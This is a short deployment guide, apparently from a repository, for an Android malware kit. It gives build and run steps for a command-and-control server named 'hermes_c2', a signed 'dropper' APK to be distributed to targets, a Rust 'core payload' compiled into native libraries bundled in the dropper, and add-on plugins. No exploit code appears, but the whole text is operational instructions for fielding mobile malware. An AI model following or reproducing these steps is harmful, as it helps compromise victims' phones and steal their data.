# Deployment Guide

## C2 Server Deployment

### Requirements
- Go 1.16+
- PostgreSQL database
- HTTPS certificate

### Steps
1. Build the server binary
   ```
   cd c2_server
   go build -o hermes_c2 ./cmd/server
   ```

2. Configure the server
   - Edit `config/config.json` with appropriate settings
   - Set up database connection parameters
   - Configure TLS certificates

3. Run the server
   ```
   ./hermes_c2
   ```

## Dropper App Deployment

### Requirements
- Android Studio 4.0+
- Gradle 7.0+
- Android SDK 21+

### Steps
1. Build the APK
   ```
   cd dropper_app
   ./gradlew assembleRelease
   ```

2. Sign the APK
   ```
   zipalign -v 4 app-release-unsigned.apk app-release-aligned.apk
   apksigner sign --ks keystore.jks app-release-aligned.apk
   ```

3. Distribute the APK through appropriate channels

## Core Payload Deployment

### Requirements
- Rust 1.50+
- Android NDK
- Cargo NDK

### Steps
1. Build the core payload
   ```
   cd core_payload
   cargo ndk -t armeabi-v7a -t arm64-v8a -t x86 -t x86_64 build --release
   ```

2. Copy the built libraries to the dropper app
   ```
   cp target/*/release/libcore_payload.so ../dropper_app/app/src/main/jniLibs/
   ```

## Plugins Deployment

### Requirements
- CMake 3.10+
- Android NDK

### Steps
1. Build the plugins
   ```
   cd plugins
   mkdir build && cd build
   cmake .. -DCMAKE_TOOLCHAIN_FILE=$ANDROID_NDK/build/cmake/android.toolchain.cmake -DANDROID_ABI=arm64-v8a
   make
   ```

2. Copy the built plugins to the appropriate location
   ```
   cp *.so ../../dropper_app/app/src/main/assets/plugins/
   ```